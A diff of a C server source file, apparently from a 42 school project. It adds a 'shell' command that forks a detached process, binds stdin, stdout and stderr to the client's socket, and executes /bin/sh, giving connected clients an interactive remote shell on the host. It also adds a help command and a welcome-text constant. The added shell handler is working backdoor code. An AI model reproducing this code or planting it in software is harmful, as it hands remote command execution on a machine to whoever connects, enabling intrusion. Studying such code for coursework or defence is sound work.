@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:28:48 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/21 13:35:45 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/21 15:11:48 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,6 +33,28 @@ static int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
 	return (1);
 }
 
+static void	start_remote_shell(t_ctx *ctx, t_client *client)
+{
+	logger_log(ctx, LOG_LOG, "Client %d shell command entered", client->id);
+	server_send_to_id(&ctx->server, client->id, RVRS_SHELL_TEXT);
+
+	client->shell_pid = fork();
+	if (client->shell_pid == 0)
+	{
+		setsid();
+
+		dup2(client->fd, STDOUT_FILENO);
+		dup2(client->fd, STDERR_FILENO);
+		dup2(client->fd, STDIN_FILENO);
+
+		ctx_delete(ctx);
+
+		char	*argv[] = {"/bin/sh", NULL};
+		execv("/bin/sh", argv);
+		exit(0);
+	}
+}
+
 void	message_hook(t_client *client, char *msg, void *ptr)
 {
 	t_ctx	*ctx = ptr;
@@ -41,13 +63,21 @@ void	message_hook(t_client *client, char *msg, void *ptr)
 		return ;
 
 	logger_log(ctx, LOG_LOG, "From %d: %s", client->id, msg);
+	
+	if (!strcmp(msg, "shell"))
+		start_remote_shell(ctx, client);
+	if (!strcmp(msg, "help"))
+	{
+		logger_log(ctx, LOG_LOG, "Client %d help command entered", client->id);
+		server_send_to_id(&ctx->server, client->id, HELP_TEXT);
+	}
 }
 
 void	connect_hook(t_client *client, void *ptr)
 {
 	t_ctx	*ctx = ptr;
 
-	server_send_to_id(&ctx->server, client->id, "Welcome to server!\n");
+	server_send_to_id(&ctx->server, client->id, WELCOME_TEXT);
 	server_send_to_id(&ctx->server, client->id, PASSWORD_PROMPT_TEXT);
 	logger_log(ctx, LOG_INFO, "Client %d joined", client->id);
 }
